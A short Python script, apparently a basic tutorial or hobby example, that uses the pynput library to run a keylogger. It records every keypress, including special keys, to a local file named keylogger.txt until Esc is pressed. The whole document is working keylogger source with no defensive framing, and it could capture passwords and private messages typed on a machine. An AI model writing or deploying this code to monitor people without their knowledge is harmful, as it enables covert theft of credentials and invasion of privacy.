from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "keylogger.txt"

def log_key(key):
    try:
        with open(log_file, "a") as file:
            file.write(key.char)
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f'[{key}]')

def stop_listener(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start the listener
with Listener(on_press=log_key, on_release=stop_listener) as listener:
    listener.join()
